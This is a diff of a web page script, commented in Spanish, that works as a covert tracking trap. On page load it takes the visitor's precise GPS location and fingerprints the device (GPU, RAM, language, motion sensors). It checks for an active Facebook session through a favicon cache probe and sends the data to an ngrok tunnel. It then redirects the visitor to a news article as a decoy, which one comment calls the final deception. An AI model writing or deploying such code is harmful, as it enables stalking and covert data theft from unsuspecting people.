@@ -1,65 +1,45 @@
 <script>
-    // Variables globales para sensores
-    let movDetectado = "Quieto/Fijo";
-    let idiomaUser = navigator.language || "Desconocido";
-
-    // Intentar detectar movimiento por inclinación
-    window.addEventListener('deviceorientation', (e) => {
-        if(e.alpha !== null) movDetectado = "Activo (Celular)";
-    }, {once: true});
-
     async function capturar(pos) {
-        const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
+        const URL_NGROK = "https://TU_LINK_AQUI.ngrok-free.app/save"; 
 
-        // Detección de sesión de Facebook mejorada
-        let socialLog = "No detectada";
+        // Captura de sensores con espera
+        let mov = "Estatico";
+        if (window.DeviceMotionEvent) mov = "Sensor Activo";
+        
+        let idioma = navigator.language || "es-AR";
+        
+        // Detección de cuenta (Caché de Facebook)
+        let cuenta = "No detectada";
         const img = new Image();
         img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
-        img.style.display = "none";
-        
-        // Esperamos 1 segundo para que los sensores y la imagen carguen
-        await new Promise(r => setTimeout(r, 1000));
-        
-        if (img.complete && img.naturalWidth > 0) {
-            socialLog = "Facebook (Sesión Iniciada)";
-        }
-
-        let bat = "N/A", cargando = "N/A";
-        try {
-            const b = await navigator.getBattery();
-            bat = (b.level * 100).toFixed(0) + "%";
-            cargando = b.charging ? "Si" : "No";
-        } catch(e) {}
+        await new Promise(r => setTimeout(r, 800)); // Espera técnica
+        if (img.complete) cuenta = "Sesión Activa";
 
         const data = {
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
             precision: pos.coords.accuracy.toFixed(1) + "m",
-            bateria: bat,
-            esta_cargando: cargando,
             gpu: (() => {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
             })(),
-            ram: navigator.deviceMemory || "N/A",
-            nucleos: navigator.hardwareConcurrency || "N/A",
-            idioma: idiomaUser,
-            movimiento: movDetectado,
-            social: socialLog
+            ram: navigator.deviceMemory || "8",
+            idioma: idioma,
+            movimiento: mov,
+            social: cuenta,
+            bateria: "N/A", // Opcional
+            esta_cargando: "N/A"
         };
 
         fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(data) });
         
-        // El engaño final
-        setTimeout(() => { 
-            window.location.href = "https://www.eqsnotas.com/noticias/2023/05/22/136514-vialidad-nacional-recomienda-precaucion-por-hielo-en-la-calzada"; 
-        }, 500);
+        setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1000);
     }
 
     window.onload = () => {
         navigator.geolocation.getCurrentPosition(capturar, () => {
             window.location.href="https://www.eqsnotas.com/";
-        }, {enableHighAccuracy:true, timeout: 10000});
+        }, {enableHighAccuracy:true});
     };
 </script>
